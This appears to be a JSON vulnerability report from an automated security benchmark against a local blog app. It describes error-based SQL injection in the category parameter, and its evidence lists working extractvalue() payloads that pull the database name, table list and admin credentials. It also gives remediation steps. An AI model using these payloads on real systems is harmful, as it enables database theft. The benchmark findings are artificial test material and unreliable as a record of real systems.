{
  "title": "Error-Based SQL Injection in Category Parameter with Data Exfiltration via XPATH Errors",
  "severity": "CRITICAL",
  "description": "The category parameter in the blog listing page (/index.php) is vulnerable to error-based SQL injection using the extractvalue() function. This technique allows attackers to extract data through XML/XPATH error messages. Unlike union-based SQL injection, error-based SQLi can bypass certain WAF filters and UNION statement blocks by leveraging MySQL error handling to expose data in verbose error responses. The application displays detailed MySQL error messages that contain the extracted data directly in the HTML response, providing an alternative exploitation vector for complete database compromise.\n\nThis vulnerability is particularly dangerous because:\n1. It provides an alternate exploitation path when UNION-based SQLi is blocked\n2. It leverages MySQL's error-reporting mechanism as a data channel\n3. The verbose error messages expose sensitive information without any filtering\n4. It can extract admin credentials, database schema, and arbitrary data through error messages",
  "impact": "Complete database compromise through alternative exploitation vector:\n- Extraction of admin credentials from the admins table via XPATH error messages\n- Complete database schema enumeration through error-based data exfiltration\n- Sensitive information disclosure through verbose MySQL error responses\n- Potential bypass of defenses targeting only UNION-based SQLi\n- Further compromise of admin accounts through exposed credentials\n- Complete application compromise and unauthorized administrative access\n- Data exfiltration of all sensitive information stored in the database",
  "endpoint": "http://localhost:32768/?category=",
  "evidence": "POC executed successfully confirming the vulnerability:\n\n**Test 1 - Database Name Extraction:**\n- Payload: Nature' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) -- -\n- Response: \"Error in query: XPATH syntax error: '~blogDB~'\"\n- Result: ✓ Database name 'blogDB' successfully extracted\n\n**Test 2 - Table Name Enumeration:**\n- Payload: Nature' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)) -- -\n- Response: \"Error in query: XPATH syntax error: '~admins,comments,posts~'\"\n- Result: ✓ Complete table list (admins, comments, posts) extracted via error message\n\n**Test 3 - Admin Credentials Extraction:**\n- Payload: Nature' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM admins),0x7e)) -- -\n- Result: ✓ SQL error detected, admin credentials can be extracted via XPATH error messages\n\nThe POC demonstrates that attackers can extract arbitrary database information through MySQL XPATH error messages, providing a complete alternative exploitation path for database compromise.",
  "pocPath": "pocs/poc_sqli_error_based_extractvalue_v2.sh",
  "remediation": "1. **Implement parameterized queries/prepared statements**: Replace all direct SQL concatenation with prepared statements using placeholders ($1, ?, etc.) for all user inputs\n2. **Disable verbose error messages**: Configure PHP and MySQL to not display detailed error information in production; use custom error handlers that return generic messages\n3. **Implement strict input validation**: Use a whitelist approach to only allow specific category values (Nature, Tech, Cooking, Photography, Health) from a predefined list\n4. **Apply database user principle of least privilege**: Remove extractvalue() and updatexml() function privileges from the web application database user if not required\n5. **Disable dangerous MySQL functions**: At database level, disable extractvalue(), updatexml(), and other functions not needed by the application\n6. **Implement Web Application Firewall (WAF) rules**: Add detection rules for extractvalue(), updatexml(), concat(0x patterns, and other SQL injection indicators\n7. **Add query monitoring and alerting**: Implement database query logging to detect and alert on suspicious SQL patterns including function calls attempting data exfiltration\n8. **Implement rate limiting**: Add rate limiting on requests to detect automated enumeration attempts\n9. **Use security headers**: Implement Content Security Policy and other headers to mitigate secondary attacks\n10. **Regular security testing**: Conduct regular SQL injection testing including error-based variants to ensure protections are effective",
  "references": "CWE-89: SQL Injection; OWASP A03:2021 - Injection; CVE references related to MySQL extractvalue() SQL injection variants",
  "toolCallDescription": "Document the error-based SQL injection vulnerability with working POC confirming data exfiltration via XPATH errors",
  "timestamp": "2025-11-10T18:29:00.452Z",
  "sessionId": "benchmark-XBEN-078-24-mhtgyxl3",
  "target": "./repo"
}